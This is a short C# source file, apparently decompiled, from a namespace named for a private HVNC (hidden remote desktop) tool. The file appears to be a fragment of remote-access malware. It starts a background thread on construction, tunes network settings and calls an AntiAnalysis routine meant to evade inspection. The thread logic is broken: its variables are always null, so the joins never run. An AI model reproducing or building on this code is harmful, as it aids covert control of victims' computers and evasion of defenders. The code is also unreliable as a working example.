using System;
using System.Net;
using System.Runtime.CompilerServices;
using System.Threading;

namespace ShitarusPrivate.HVNC.Helpers
{
    internal class art
    {
        [Serializable]
        [CompilerGenerated]
        private sealed class __c
        {
            public static readonly __c __9 = new __c();

            public static ThreadStart __9__0_0;

            internal void __002Ector_b__0_0()
            {
                Thread thread = null;
                Thread thread2 = null;
                ServicePointManager.Expect100Continue = true;
                ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
                ServicePointManager.DefaultConnectionLimit = 9999;
                if (AntiAnalysis.Run() && thread != null && thread.IsAlive)
                {
                    thread.Join();
                }
                if (thread != null && thread2 != null && thread2.IsAlive)
                {
                    thread2.Join();
                }
            }
        }

        public art()
        {
            new Thread(__c.__9__0_0 ?? (__c.__9__0_0 = __c.__9.__002Ector_b__0_0)).Start();
        }
    }
}
